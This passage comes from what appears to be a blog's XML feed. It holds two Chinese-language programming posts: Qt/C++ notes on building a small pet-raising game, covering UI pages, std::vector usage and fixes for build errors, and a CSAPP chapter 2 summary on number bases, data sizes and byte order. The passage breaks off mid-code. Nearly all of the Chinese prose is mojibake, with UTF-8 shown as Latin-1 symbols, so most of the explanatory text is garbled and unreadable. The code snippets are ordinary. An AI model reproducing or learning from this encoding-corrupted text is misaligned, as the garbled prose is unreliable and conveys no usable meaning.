title="UIç•Œé¢"></a>UIç•Œé¢</h6><p>ä½¿ç”¨å®¹å™¨Stacked Widgetï¼Œä¼šè‡ªåŠ¨åˆ†é¡µåˆ†ä¸ºä¸¤ä¸ªçª—å£ã€‚</p><p>åˆæ­¥è®¡åˆ’å°†ç¬¬ä¸€ä¸ªçª—å£ä½œä¸ºhomeé¡µé¢å³æ¸¸æˆä¸»é¡µé¢ï¼Œç¬¬äºŒä¸ªçª—å£ä½œä¸ºå•†åº—é¡µé¢</p><p>æ‰€æœ‰åŸºç¡€çš„æ¸¸æˆèƒŒæ™¯éƒ½æ˜¯ä½¿ç”¨ photoshop åˆ¶ä½œå®Œæˆã€‚</p><p>è®¾ç½®æŒ‰é’®ååˆ©ç”¨å›¾å½¢ç•Œé¢è®¾ç½®è·³è½¬</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_13-37-42.png"></p><p>é€‰æ‹©releasedæ˜¯ç‚¹å‡»æ¾å¼€åè·³è½¬ã€‚</p><p>åœ¨.cppæ–‡ä»¶å†…è®¾ç½®å“åº”ä»£ç ä½¿æŒ‡é’ˆæŒ‡å‘è·³è½¬é¡µé¢</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-29_13-50-21.png"></p><p>é¡µé¢åˆ©ç”¨ ps ç›´æ¥åˆ¶ä½œç›¸åº”éåŠŸèƒ½æŒ‰é’®éƒ¨åˆ†å‡å°‘å·¥ä½œé‡</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/%E8%B5%84%E6%BA%90.png"></p><h3 id="7-é‡åˆ°çš„é—®é¢˜"><a href="#7-é‡åˆ°çš„é—®é¢˜" class="headerlink" title="7.é‡åˆ°çš„é—®é¢˜"></a>7.é‡åˆ°çš„é—®é¢˜</h3><h4 id="7-1-C-ä»£ç "><a href="#7-1-C-ä»£ç " class="headerlink" title="7.1 C++ä»£ç "></a>7.1 C++ä»£ç </h4><h5 id="7-1-1-é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç "><a href="#7-1-1-é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç " class="headerlink" title="7.1.1 é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç "></a>7.1.1 é»‘çª—ä¸­æ–‡è¾“å‡ºä¹±ç </h5><p>run codeæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯é»‘æ¡†æ˜¯ä¹±ç ï¼Œæ®è¯´äºŒè€…ä¸å¯å…¼å¾—ï¼Œå°±è¿™æ ·å§</p><p>å“ˆå“ˆæ²¡æœ‰è§£å†³æ–¹æ¡ˆğŸ¤ª</p><h5 id="7-1-2-å•†åº—çš„å®ç°"><a href="#7-1-2-å•†åº—çš„å®ç°" class="headerlink" title="7.1.2 å•†åº—çš„å®ç°"></a>7.1.2 å•†åº—çš„å®ç°</h5><blockquote><p>æœ€åå‘ç°æˆ‘å¯ä»¥ä¸ç”¨å•†åº—è¿™ä¸ªç±»ï¼Œå› ä¸ºåœ¨æ¸¸æˆä¸­çš„å•†åº—æ•°æ®æ˜¯é™æ€çš„ä¸ä¼šå¢åŠ æˆ–å‡å°‘ï¼Œç›´æ¥åœ¨mainå‡½æ•°ä¸­è®¾ç½®å³å¯ï¼Œå¯ä»¥å‡å°‘ä»£ç å†—ä½™é‡ã€‚</p></blockquote><p>å‰æƒ…æè¦ï¼š</p><p>å¦‚æœç›´æ¥è®¾ç½®å•†åº—ç±»ï¼Œæ— æ³•å®ç°å•†åº—ä¸­æœ‰å¤šç§å¯é€‰æ‹©çš„å•†å“ã€‚æ‰€ä»¥è®¾æƒ³æ˜¯å…ˆå®šä¹‰ä¸€ä¸ªå•†å“ç±»ï¼Œå•†å“ç±»ä¸­å­˜å‚¨å•†å“çš„åç§°å’Œä»·æ ¼æ•°æ®ã€‚å†è®¾ç½®å•†åº—ç±»ï¼Œåœ¨å•†åº—ç±»ä¸­å­˜å‚¨å•†å“çš„æ•°ç»„ï¼Œå¹¶å®šä¹‰è´­ç‰©çš„å‡½æ•°ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•å®ç°åœ¨å•†åº—ä¸­å­˜å‚¨å•†å“æ•°ç»„å‘¢ï¼Ÿ</p><p><code>vector&lt;Product&gt; products;</code>è¿™å¥ä»£ç å£°æ˜äº†ä¸€ä¸ªåä¸º<code>products</code>çš„å˜é‡ï¼Œç±»å‹ä¸º<code>vector&lt;Product&gt;</code>ã€‚<code>vector</code>æ˜¯C++æ ‡å‡†åº“ä¸­çš„å®¹å™¨ç±»ä¹‹ä¸€ï¼Œç”¨äºå­˜å‚¨å¤šä¸ªå…ƒç´ çš„åŠ¨æ€æ•°ç»„ã€‚</p><p>éœ€è¦é…åˆå¤´æ–‡ä»¶<code>#include&lt;vector&gt;</code>ä½¿ç”¨ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œæœ‰ä»¥ä¸‹å‡ ç§å›ºå®šçš„å‡½æ•°ä½¿ç”¨è§„å®šï¼š</p><p>å¯¹äº <code>vector</code> å®¹å™¨ï¼Œå¯ä»¥å¯¹æ•°ç»„è¿›è¡ŒåŠ¨æ€è°ƒæ•´ã€æ·»åŠ ã€åˆ é™¤å’ŒæŸ¥æ‰¾å…ƒç´ ç­‰æ“ä½œï¼š</p><ol><li><p>æ·»åŠ å…ƒç´ ï¼šä½¿ç”¨ <code>push_back()</code> å‡½æ•°å°†æ–°å…ƒç´ æ·»åŠ åˆ°æ•°ç»„çš„æœ«å°¾ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">push_back</span>(product);  <span class="hljs-comment">// å‘æ•°ç»„æœ«å°¾æ·»åŠ ä¸€ä¸ªæ–°å…ƒç´ </span><br></code></pre></td></tr></table></figure></li><li><p>åˆ é™¤å…ƒç´ ï¼šä½¿ç”¨ <code>erase()</code> å‡½æ•°åˆ é™¤æŒ‡å®šä½ç½®æˆ–æŒ‡å®šå…ƒç´ ã€‚</p><ul><li><p>åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(products.<span class="hljs-built_in">begin</span>() + index);  <span class="hljs-comment">// åˆ é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼Œindex ä¸ºå…ƒç´ çš„ç´¢å¼•</span><br></code></pre></td></tr></table></figure></li><li><p>åˆ é™¤æŒ‡å®šå…ƒç´ çš„æ‰€æœ‰åŒ¹é…é¡¹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(std::<span class="hljs-built_in">remove</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product), products.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// åˆ é™¤æŒ‡å®šå…ƒç´ çš„æ‰€æœ‰åŒ¹é…é¡¹</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>æŸ¥æ‰¾å…ƒç´ ï¼šå¯ä»¥ä½¿ç”¨ <code>find()</code> å‡½æ•°æˆ–éå†æ•°ç»„æ¥æŸ¥æ‰¾æŒ‡å®šå…ƒç´ ã€‚</p><ul><li><p>ä½¿ç”¨ <code>find()</code> å‡½æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product);  <span class="hljs-comment">// åœ¨æ•°ç»„ä¸­æŸ¥æ‰¾æŒ‡å®šå…ƒç´ ï¼Œproduct ä¸ºè¦æŸ¥æ‰¾çš„å…ƒç´ </span><br><span class="hljs-keyword">if</span> (it != products.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-comment">// å…ƒç´ æ‰¾åˆ°</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// å…ƒç´ æœªæ‰¾åˆ°</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>éå†æ•°ç»„ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : products) &#123;<br>    <span class="hljs-comment">// å¯¹æ¯ä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œitem ä¸ºå½“å‰éå†åˆ°çš„å…ƒç´ </span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="7-2-QTæŠ¥é”™"><a href="#7-2-QTæŠ¥é”™" class="headerlink" title="7.2 QTæŠ¥é”™"></a>7.2 QTæŠ¥é”™</h4><h5 id="7-2-1-qmakeé—®é¢˜"><a href="#7-2-1-qmakeé—®é¢˜" class="headerlink" title="7.2.1 qmakeé—®é¢˜"></a>7.2.1 qmakeé—®é¢˜</h5><p>Error while building&#x2F;deploying project ShortTerm (kit: Desktop Qt 5.12.3 MinGW 64-bit)</p><p>When executing step â€œqmakeâ€</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-14-50.png"></p><p>é—®é¢˜åŸå› å°±æ˜¯æ„å»ºç›®å½•ä¸èƒ½æ”¾ç½®åœ¨ä¸­æ–‡ç›®å½•ä¸‹ï¼Œéœ€è¦åœ¨è‹±æ–‡ç›®å½•é‡Œå»ºç«‹æ–‡ä»¶ã€‚</p><h5 id="7-2-2-å›¾ç‰‡è½½å…¥æŠ¥é”™"><a href="#7-2-2-å›¾ç‰‡è½½å…¥æŠ¥é”™" class="headerlink" title="7.2.2 å›¾ç‰‡è½½å…¥æŠ¥é”™"></a>7.2.2 å›¾ç‰‡è½½å…¥æŠ¥é”™</h5><p>error: No rule to make target â€˜img&#x2F;???-1.pngâ€™, needed by â€˜debug&#x2F;qrc_img.cppâ€™.  Stop.</p><p>å‘ç”Ÿåœ¨æ·»åŠ å®Œèµ„æºååœ¨QTç•Œé¢ä¸ºå›¾ç‰‡é‡å‘½åçš„æƒ…å†µã€‚</p><p>æ‰¾åˆ°æ–‡ä»¶å¤¹ä¸­çš„<code>.qmake.stash</code>ï¼Œå°†å…¶åˆ é™¤é‡æ–°æ„å»ºä¸€æ¬¡ç¨‹åºå³å¯ã€‚ </p><h5 id="7-2-3-è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º"><a href="#7-2-3-è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º" class="headerlink" title="7.2.3 è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º"></a>7.2.3 è½½å…¥èµ„æºåå›¾ç‰‡ä¸æ˜¾ç¤º</h5><p>åœ¨æ·»åŠ å®Œèµ„æºæ–‡ä»¶ä»¥åï¼Œè¦å…ˆ<code>èœå•æ -&gt;æ„å»º-&gt;qmakeä¸€ä¸‹</code>ï¼Œå¦åˆ™æ˜¯æ— æ³•æ˜¾ç¤ºçš„ã€‚</p><h5 id="7-2-4-å¡æ­»"><a href="#7-2-4-å¡æ­»" class="headerlink" title="7.2.4 å¡æ­»"></a>7.2.4 å¡æ­»</h5><p>æ–°å»ºä¸€é¡µpageåè®¾ç½®æ ·å¼è¡¨ä¼šå¡æ­»ï¼Œæ²¡æœ‰æ­£é¢è§£å†³æ–¹æ³•ï¼Œç­‰ä¸€ä¼šå†å¼„æˆ–è€…ç”¨Qt Designerå•ç‹¬é…ç½®uiã€‚</p><p>å—·ï¼Œè¿˜å¯ä»¥ç›´æ¥ç”¨ä»£ç è®¾ç½®æ ·å¼è¡¨ï¼Œä¸è¦ç”¨é€‰é¡¹å°±ä¸ä¼šå¡ã€‚</p><p><del>åˆ«ç®¡äº†æˆ‘ç²¾ç¥å¤±å¸¸äº†</del></p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_15-14-34.png"></p><h5 id="7-2-5-æ§½ä¿¡å·"><a href="#7-2-5-æ§½ä¿¡å·" class="headerlink" title="7.2.5 æ§½ä¿¡å·"></a>7.2.5 æ§½ä¿¡å·</h5><p>D:\software\QT\qt_project\PuppiesMakeAHome\debug\moc_shijx_widget.cpp:236: error: undefined reference to &#96;ShiJX_Widget::on_pushButton_gotostore_2_released()â€™</p><p>æŠ¥é”™æ˜¯å› ä¸ºé”™è¯¯åœ°å»ºç«‹äº†ä¸€ä¸ªæ§½ä¿¡å·ï¼Œä½†æ˜¯ä¸æƒ³è¦äº†ã€‚</p><p>å°±åªåœ¨.cppæ–‡ä»¶ä¸­åˆ é™¤äº†å¯¹åº”çš„å‡½æ•°ã€‚</p><p>è§£å†³æ–¹æ³•æ˜¯åœ¨.hå¤´æ–‡ä»¶ä¸­æ‰¾åˆ°å¯¹åº”çš„å£°æ˜åˆ é™¤ï¼Œå¹¶å°†.cppæ–‡ä»¶ä¸­çš„å‡½æ•°åˆ é™¤ï¼Œæœ€åé‡æ„é¡¹ç›®ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬äºŒç«  ä¿¡æ¯å­˜å‚¨ æ€»ç»“</title>
    <link href="/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>è®¡ç®—æœºå¦‚ä½•å­˜å‚¨æ•°æ®</p><span id="more"></span><h2 id="æ•°å­—è¡¨ç¤º"><a href="#æ•°å­—è¡¨ç¤º" class="headerlink" title="æ•°å­—è¡¨ç¤º"></a>æ•°å­—è¡¨ç¤º</h2><h4 id="äºŒè¿›åˆ¶"><a href="#äºŒè¿›åˆ¶" class="headerlink" title="äºŒè¿›åˆ¶"></a>äºŒè¿›åˆ¶</h4><p>äºŒè¿›åˆ¶çš„è‹±æ–‡ç®€å†™ä¸º bin ï¼Œç”¨æ•°å­— 1 å’Œ0 è¡¨ç¤ºã€‚</p><p>ç°ä»£è®¡ç®—æœºå­˜å‚¨å’Œå¤„ç†ä¿¡æ¯éƒ½ç”¨<strong>äºŒè¿›åˆ¶</strong>è¡¨ç¤ºï¼Œå…¶åŸå› æ˜¯äºŒå€¼ä¿¡å·èƒ½å¤Ÿå¾ˆå®¹æ˜“åœ°è¢«è¡¨ç¤ºã€å­˜å‚¨å’Œä¼ è¾“ã€‚</p><p>å¯¹äºäººç±»ï¼Œåè¿›åˆ¶åˆšå¥½å¯¹åº”åä¸ªæ‰‹æŒ‡ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨åè¿›åˆ¶è¡¨ç¤ºï¼›è€Œå¯¹äºè®¡ç®—æœºï¼Œå°±åƒæŸä¸€æŒ‡ç¤ºç¯æ˜¯å¦äº®èµ·ã€å¯¼çº¿æ˜¯å¦è¿é€šè¿™æ ·çš„è¡¨ç¤ºï¼Œå°±åªæœ‰ â€œæ˜¯â€ æˆ– â€œå¦â€ ä¸¤ç§å¯èƒ½ï¼Œæ­£å¯¹åº”äºŒè¿›åˆ¶0å’Œ1ï¼Œæ‰€ä»¥åœ¨æœºç®—æœºä¸­äºŒè¿›åˆ¶å€¼å·¥ä½œå¾—æ›´å¥½ã€‚</p><h4 id="åå…­è¿›åˆ¶"><a href="#åå…­è¿›åˆ¶" class="headerlink" title="åå…­è¿›åˆ¶"></a>åå…­è¿›åˆ¶</h4><p>åå…­è¿›åˆ¶çš„è‹±æ–‡ç®€å†™ä¸º hex ï¼Œä½¿ç”¨æ•°å­— 0 ~ 9 å’Œå­—æ¯ A ~ F æ¥è¡¨ç¤ºã€‚</p><p>åœ¨ C è¯­è¨€ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ç”¨ <code>0x</code> æ¥ä½œä¸ºè¾¨åˆ«åå…­è¿›åˆ¶æ•°å­—çš„æ ‡å¿—ã€‚Cè¯­è¨€ä¸­çš„åå…­è¿›åˆ¶æ•°å­—<strong>å¤§å°å†™ç­‰æ•ˆ</strong>ï¼Œæ¯”å¦‚äºŒè¿›åˆ¶æ•°å­— FA1D37B æˆ‘ä»¬å¯ä»¥è¡¨ç¤ºä¸º 0xfa1d37b ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸º 0XFA1D37B ç”šè‡³å¤§å°å†™æ··åˆ 0xFa1D37bã€‚</p><h4 id="ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢"><a href="#ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢"></a>ä¸åŒè¿›åˆ¶ä¹‹é—´çš„è½¬æ¢</h4><p>æˆ‘ä»¬äºŒè¿›åˆ¶ã€åå…­è¿›åˆ¶ä¸åè¿›åˆ¶è½¬æ¢æ–¹æ³•å°±æ˜¯æƒå€¼ç›¸åŠ æˆ–è€…æ˜¯é™¤åŸºå€¼å–ä½™ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">10 = ( 2^0 *0 + 2^1 *1 + 2^2 *0 + 2^3 *1 ) -&gt; 1010 <br>100 = 16^1 *6 + 16^0 *4 -&gt; 0x64<br></code></pre></td></tr></table></figure><p>å¯¹äºäºŒè¿›åˆ¶å’Œåå…­è¿›åˆ¶ä¹‹é—´çš„è½¬æ¢ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æ¯ä¸€ä½åå…­è¿›åˆ¶æ•°è§†ä½œå››ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œå°†æ¯ä¸€ä½åˆ†åˆ«è½¬æ¢å†ç»„åˆå‡ºç»“æœï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">0x3c81e -&gt; 3 + c + 8 + 1 + e -&gt; 0011 1100 1000 0001 1110<br></code></pre></td></tr></table></figure><h2 id="ä¿¡æ¯å­˜å‚¨"><a href="#ä¿¡æ¯å­˜å‚¨" class="headerlink" title="ä¿¡æ¯å­˜å‚¨"></a>ä¿¡æ¯å­˜å‚¨</h2><h3 id="å­—èŠ‚"><a href="#å­—èŠ‚" class="headerlink" title="å­—èŠ‚"></a>å­—èŠ‚</h3><p>å­—èŠ‚æ˜¯è®¡ç®—æœºå¯å¯»å€çš„æœ€å°å•ä½ï¼Œä¸€ä¸ªå­—èŠ‚ç”± 8 ä½äºŒè¿›åˆ¶ä½ç»„æˆã€‚</p><blockquote><p>è®¡ç®—æœºåªä¼šå»è®¿é—®å­—èŠ‚ 8 ä½æ•´ä½“ï¼Œè€Œä¸ä¼šå»è®¿é—®å†…å­˜ä¸­æŸä¸ªå•ç‹¬çš„ä½ã€‚</p></blockquote><p>ä½†æ˜¯å› ä¸ºäºŒè¿›åˆ¶çš„è¡¨ç¤ºè¿‡äºå†—é•¿ï¼Œæˆ‘ä»¬åœ¨å®é™…çš„è¡¨ç¤ºä¸­å¹¶ä¸æ˜¯ä½¿ç”¨äºŒè¿›åˆ¶æ¥æè¿°ä½æ¨¡å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šä½¿ç”¨åå…­è¿›åˆ¶æ¥è¡¨ç¤ºä½æ¨¡å¼ã€‚å…«ä½çš„äºŒè¿›åˆ¶å°±å¯¹åº”ä¸¤ä½16è¿›åˆ¶çš„æ•°ã€‚</p><h3 id="å­—æ•°æ®å¤§å°"><a href="#å­—æ•°æ®å¤§å°" class="headerlink" title="å­—æ•°æ®å¤§å°"></a>å­—æ•°æ®å¤§å°</h3><p>æ¯å°è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ªå­—é•¿ï¼Œè¡¨æ˜æŒ‡é’ˆæ•°æ®çš„æ ‡ç§°å¤§å°ï¼ŒåŒæ—¶å­—é•¿ä¹Ÿæ˜¯è®¡ç®—æœº <code>CPU</code> ä¸€æ¬¡èƒ½å¤„ç†çš„æœ€å¤§æ•°æ®ã€‚</p><p>ç”±å­—é•¿å†³å®šçš„çš„ç³»ç»Ÿå‚æ•°æ˜¯è™šæ‹Ÿåœ°å€ç©ºé—´çš„æœ€å¤§å¤§å°ã€‚ä¹Ÿå°±æ˜¯è¯´å¯¹äºä¸€ä¸ªå­—é•¿ä¸º x ä½çš„æœºå™¨æ¥è¯´ï¼Œè™šæ‹Ÿåœ°å€çš„èŒƒå›´å°±æ˜¯ 0 ~ 2^x-1ã€‚ç”±æ­¤ï¼Œæˆ‘ä»¬å°±çŸ¥é“ä¸ºä»€ä¹ˆ 32 ä½çš„è®¡ç®—æœºçš„å†…å­˜ä¸º 4GB ä¹Ÿå°±æ˜¯ 2^32 å­—èŠ‚äº†ã€‚</p><p>å¤§å¤šæ•° 64 ä½çš„æœºå™¨éƒ½å¯ä»¥è¿è¡Œ 32 ä½æœºå™¨ç¼–è¯‘çš„ç¨‹åºï¼Œæˆ‘ä»¬å¸¸è¯´çš„ 32 ä½ç¨‹åºå’Œ 64 ä½ç¨‹åºçš„åŒºåˆ«åœ¨äºç¼–è¯‘çš„æ–¹å¼è€Œä¸æ˜¯è¿è¡Œçš„æœºå™¨ç±»å‹ã€‚</p><p>è®¡ç®—æœºçš„ä¸åŒæ•°æ®æ‰€å å­—èŠ‚çš„å¤§å°ä¹Ÿä¸åŒï¼Œå…·ä½“å¦‚ä¸‹è¡¨ï¼š</p><table><thead><tr><th>Cå£°æ˜</th><th>32ä½æœºå™¨</th><th>64ä½æœºå™¨</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>8</td></tr><tr><td>int32_t</td><td>4</td><td>4</td></tr><tr><td>int64_t</td><td>8</td><td>8</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><blockquote><p>Cè¯­è¨€ä¸­å¯ä»¥ç”¨ sizeof( ) æ¥è¿”å›æŸç§ç±»å‹æ•°æ®çš„å­—èŠ‚æ•°</p></blockquote><p>ç”±ä¸Šè¡¨å¯çŸ¥ï¼Œåªæœ‰æŒ‡é’ˆç±»å‹çš„æ•°æ®ä¼šéšç€æœºå™¨å­—é•¿å‘ç”Ÿå˜åŒ–ã€‚å°±æ˜¯å‰é¢è¯´çš„ï¼Œæœºå™¨å­—é•¿å†³å®šäº†æŒ‡é’ˆå¤§å°ã€‚</p><h3 id="å¯»å€å’Œå­—èŠ‚é¡ºåº"><a href="#å¯»å€å’Œå­—èŠ‚é¡ºåº" class="headerlink" title="å¯»å€å’Œå­—èŠ‚é¡ºåº"></a>å¯»å€å’Œå­—èŠ‚é¡ºåº</h3><p>è·¨è¶Šå¤šå­—èŠ‚çš„ç¨‹åºå¯¹è±¡ï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤ä¸¤ä¸ªè§„åˆ™ï¼š<strong>å¯¹è±¡åœ°å€å’Œå­—èŠ‚çš„æ’åˆ—æ–¹æ³•</strong>ã€‚</p><p>å¯¹äºåœ°å€ï¼Œåœ¨å‡ ä¹æ‰€æœ‰çš„æœºå™¨ä¸Šï¼Œæ‰€å­—èŠ‚å¯¹è±¡éƒ½è¢«å­˜å‚¨ä¸ºè¿ç»­çš„å­—èŠ‚åºåˆ—ï¼Œå¯¹è±¡çš„åœ°å€å°±æ˜¯<strong>æ‰€ä½¿ç”¨çš„å­—èŠ‚ä¸­æœ€å°çš„åœ°å€</strong>ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå››å­—èŠ‚çš„ int æ•´æ•°è¢«å‚¨å­˜åœ¨ 0x100ã€0x101ã€0x102ã€x103 çš„ä½ç½®ï¼Œé‚£ä¹ˆå®ƒçš„åœ°å€å°±æ˜¯ 0x100ã€‚</p><p>å­—èŠ‚çš„æ’åˆ—è¡¨ç¤ºæ–¹æ³•æœ‰ä¸¤ä¸ªè§„åˆ™ï¼Œåˆ†åˆ«ä¸º<strong>å¤§ç«¯åº</strong>å’Œ<strong>å°ç«¯åº</strong>ã€‚</p><p>ä»¥æ•°æ® 0x12345678 ä¸ºä¾‹ï¼Œä»–çš„æœ€é«˜æœ‰æ•ˆä½æ˜¯ 12 ï¼Œæœ€ä½æœ‰æ•ˆä½æ˜¯ 78ã€‚å¤§ç«¯åºçš„æ’åˆ—æ–¹å¼æ˜¯æœ€é«˜æœ‰æ•ˆä½æ’åˆ—åœ¨æœ€å‰é¢ï¼Œå°ç«¯åºçš„æ’åˆ—æ–¹å¼æ˜¯æœ€ä½æœ‰æ•ˆä½æ’åˆ—åœ¨æœ€å‰é¢ã€‚å…·ä½“çš„å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F.png"></p><p>ç”±ä¸Šå›¾æ¥çœ‹ï¼Œå¤§ç«¯åºæ›´ç¬¦åˆäººç±»å¹³æ—¶çš„é˜…è¯»ä¹ æƒ¯ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¤§å¤šæ•°çš„ Intel å…¼å®¹æœºå™¨ä½¿ç”¨çš„éƒ½æ˜¯å°ç«¯æ¨¡å¼ã€‚æˆ‘ä»¬åœ¨ç¼–å†™æ±‡ç¼–è¯­è¨€æ—¶ï¼Œä¹Ÿéœ€è¦æŒ‰ç…§å°ç«¯åºçš„æ–¹å¼ä¹¦å†™ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‡½æ•°æ¥è¾“å‡ºä¸åŒç¨‹åºå¯¹è±¡çš„å­—èŠ‚è¡¨ç¤ºï¼Œå…¶ä¸­ <em>start</em> ä¸ºè¯¥å¯¹è±¡çš„èµ·å§‹åœ°å€ï¼Œ<em>len</em> ä¸ºæ˜¾ç¤ºçš„å­—èŠ‚æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ä¸‹é¢çš„ä¾‹å­æ¥è§‚å¯Ÿæ•´å½¢å’Œæµ®ç‚¹å‹æ•°æ®çš„å…³ç³»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span 